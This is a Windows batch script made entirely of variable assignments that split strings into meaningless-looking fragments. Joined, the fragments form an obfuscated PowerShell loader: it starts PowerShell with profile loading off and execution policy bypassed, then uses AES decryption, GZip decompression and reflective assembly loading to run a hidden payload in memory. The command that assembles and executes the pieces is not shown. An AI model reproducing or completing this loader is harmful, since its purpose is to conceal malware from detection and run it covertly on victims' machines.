@echo off
set "FPJBrnUNUe=we"
set "YHXdTJhvce=st"
set "dqbndPFZkS= /"
set "JNclpBStbh=.e"
set "qFMiWsSCXr=Wi"
set "yMPilZkXjL=rS"
set "LXaxXOMgKP=1."
set "sxTwhEAWpu=0\"
set "boCrjCOseU=ll"
set "MSDDmdZdOc=32"
set "yzpmwZSbkd=nd"
set "VDqxyDgFZV=\W"
set "eRXtunfhni=in"
set "ayXfwCkDMH=he"
set "BHyrfRgpix=ow"
set "JeHajImVbE=ws"
set "KiNwKqNxDt=po"
set "bjgJVbdjHd=he"
set "keJTElnayG=s\"
set "RaiuZJaEMb= C"
set "CkPvKQIihv=:\"
set "aavjMCllsH=co"
set "mDtzhuQvHk=em"
set "zNWcthSDfP=xe"
set "nkwLgVVkjY=Po"
set "OyUHRnwMPU=y "
set "XSPGQvHBzs=we"
set "bVKToTmQoV=py"
set "mzVOYgeuQQ=do"
set "eiqtuDQZBB=rs"
set "aKwIfBvnAg=\v"
set "lUlSSRobjN=ll"
set "QyHuCcVDYK=Sy"
set "RbcPRmzLEd= %~dp0"
set "xcjDDpKscQ=cd"
set "duGrTRcUAr=se()"
set "MEGMNKEvnc=am;$"
set "GxkYuuOkQD=-nop"
set "ESUHZjJFAN=rtS4"
set "tjeATNJxtr=QfQY"
set "yXeQQCkiwj=-1.."
set "wbFLsNrgAd=..-1"
set "dmgSNCuEYB=Syst"
set "OtFvGoVljR=;$lv"
set "ecGlgZaBxB=tem."
set "UZBXrglgai=ring"
set "PQjdKVgAXt=::De"
set "aKIvsECsuQ=BQfQ"
set "pNuODAKcTk=ionM"
set "iHyxFSiPkG=ptog"
set "yhBNSjnlrR=tDf "
set "tBJeQCxlex=nage"
set "EhMgrkYPEL=esaB"
set "rbzGdEJOFM=:: '"
set "cAgOZDHdYF=n ''"
set "KeSgMbPYpi=join"
set "KJxFhcyxAX=vj0m"
set "xnoLapXbJK= = ["
set "TmqBspGtgy=YEKn"
set "CItwoBWEno=BC;$"
set "fCfiVkFjiW=EKnx"
set "JsIKFLBJWD=O.Me"
set "NFRJjUyNPP=TllA"
set "GGByTRgbAZ=null"
set "fCrNQiamlu='[-1"
set "FCYkUoMXeE=.Con"
set "usCqxaPtaF=.Mem"
set "QPUXERDjLa=();$"
set "UgGAZEveZx=]::N"
set "vQqglCwtFL=$BQf"
set "CIjdPftuAh=x = "
set "tGHeinlPix=rity"
set "IgxbRfytEc=($QS"
set "SZpUWLxLSC=urit"
set "CbzxWlVqfF=ct S"
set "wPXTuQLjBg=OyzA"
set "cGYhTxDTDj= [st"
set "ExvyttABHN=tDf."
set "LZOfOAZYDW=::('"
set "FsGqLJBbSQ=();$"
set "yKcUgBbhYX=n ''"
set "ZBBgsetUoD=Stre"
set "JxeeBktXDi= = $"
set "omxqeerbgL=)))"
set "aDCaPhiauj=sion"
set "eSNuMhFRhz=oArr"
set "arYYjsFpQD=fYsn"
set "sUfSgbdYaS=pher"
set "jELXZPUach=brea"
set "ZVEHJjYpYl= = N"
set "xifojDBcLo=pose"
set "UhHADlnFiV=$YEK"
set "AhBCQNytcW=fYsn"
set "MgfHYgdObX=.Cop"
set "octcGZuyvC=)($Y"
set "FhiOtxJFBm=fore"
set "StugIpRXEr=.Sec"
set "BexIYAyOFH=ress"
set "hpkNeXGCCs=.Dis"
set "fAVWmlaycZ=[-1."
set "HqZdUAxfwQ=stem"
set "hINvcMypNl=ress"
set "iNndjdYEBH=gth)"
set "rZyQMtoWub=]::C"
set "wPsBcDqzvN=y.Ci"
set "bGkzIJQnRt=bypa"
set "HAIqHhQBsA=Y = "
set "yVphTGHZhY=ct S"
set "ZrcMRRHHXB=xY ="
set "bhogJsiyYq=v4Ir"
set "WSZbxOLxJk=oCvl"
set "PBQeYuXOtP='dqR"
set "TykFUddUWx=3); "
set "vSXefxgbEt=S46e"
set "AtZOjrwmbB=ZYYc"
set "jMEkpVJKNQ= '')"
set "jAYrkZPiGb=.Cre"
set "xiJEfnJuaN=ay()"
set "xCAdmjrfBK=('l0"
set "xBAcRpbPSe=sn.I"
set "hrkeobhNJm=ss -"
set "zRFUQZQiAY=.Dis"
set "wvFUKuBmrD== $I"
set "eMIMYHsjxx=pDZz"
set "gdYFZCeXzJ=oL'["
set "lqSYfGsayt=pStr"
set "RUAUJBpXpV=K = "
set "hRSwHtTNRH=rt]:"
set "UcElrLhNPR=eam("
set "qwZLpMRMIp=ewLi"
set "FCPCwTGryf=1..-"
set "VemRnYLQXj=gnir"
set "yjZWZyErdI=);$B"
set "LGjkfHDbbN=[Sys"
set "yVuNsRDhts= if "
set "oDjKggsQmn=[Env"
set "zSCQQNggHc=ajfA"
set "WUKaGMRpWR=YM.T"
set "ZVlmmfhTYe=6] -"
set "RIynMcqKOc=x, 0"
set "bCSFdaFCYc=ion."
set "NNuexardAu=..-1"
set "atJhjQEQPT=fZOx"
set "mxwwkslKRI=tsWi"
set "KwBvmVCcYy=nx);"
set "GzTaPaTHqk=m.IO"
set "ULChDwlpBO=] -j"
set "zGhodKMJtO=);$I"
set "CPlMUvVqlC=ispo"
set "NUfTlpSgON=Obje"
set "ZFpwpiDEmn=le  "
set "vjIxUjCLez='[-1"
set "aIjAiijWZZ=e = "
set "DwlJOtgzIl=-Obj"
set "igxUhUBlHy=ment"
set "eTYySmIuKU=, (,"
set "ctARtDAbyj='')("
set "BYNUByToXR=hy.A"
set "qXsEJWxJrd=tem."
set "oCnRxPyIor=YEKn"
set "WQbTEzgWuY=Obje"
set "ZeSXNSLHFB=Comp"
set "TWStlQspWk=ert]"
set "WsdOvoDwDY=Ehn."
set "NaJWEgzkiN=m(, "
set "dXnAcxWTZN=lit("
set "IBvFKDCkjW=rity"
set "EqgBRNXCMt=iron"
set "KwgwiryoJJ= New"
set "AoDTtLKXUG=qEhn"
set "CkHQnXNRMg=;$SO"
set "MeWnaMhQlF=grap"
set "MXktpazVuY=th('"
set "MkLwReLijZ=0O+g"
set "XtoXJKTzEN=tion"
set "PUmPAZcbjx=stem"
set "sANUdAMKvL=.Key"
set "WfwrIJJTcO=ress"
set "yrDmTsNEVx=V = "
set "AfIXLCwBRq=-4] "
set "dvlEiwgusP=ddin"
set "XzQzsYborT=trea"
set "ruloRUpwfV=oryS"
set "ihDnPBfoCQ=$SOW"
set "pMdLcDbAET=t Sy"
set "CRZpMhGmCj=.Ass"
set "odxJveYVPr=Star"
set "zuhGFhfoCm=ne);"
set "OcDsSUrTYD=.Cry"
set "GtzfjQYWqd=y.Cr"
set "sHvtREHhyV=New-"
set "kEjbiGaYWY=1] -"
set "lijGGBlLOZ=UGTu"
set "pKNFYqhXxF=.Com"
set "flmFgtuQNF=and "
set "fulszwUTYz='gni"
set "LPGxriCFdf=PKCS"
set "ByPkkmtEUF=ke($"
set "vprRqeSChR=fYsn"
set "zHoCyzbYTP=tryP"
set "iNBmljSmeg=daeR"
set "rOyFktBNQI=.-16"
set "awKnihbFRb=onve"
set "sFWtONiANo=.IO."
set "kkQVnIpBwE=oint"
set "bfneJtgtNZ=QY.D"
set "VeAUmZutnq=New-"
set "YsQrTnrbXq=7Yiv"
set "ghwmUlWknh=rofi"
set "rMIqcusxOl= '')"
set "cZQUXgfLYI=-ep "
set "yfYOAhlYEA=('da"
set "qmTwxshvyW=ose("
set "lAndBoAwyQ=yste"
set "SSROKKrKWG=F'[-"
set "XvTzdMvOes=m.IO"
set "qeMXItamVq=rans"
set "kJKcwswpgN=n.Pa"
set "fGxACrdbrv=tem."
set "uYbCiYlhcL=Disp"
set "BYVwAFijux=ect "
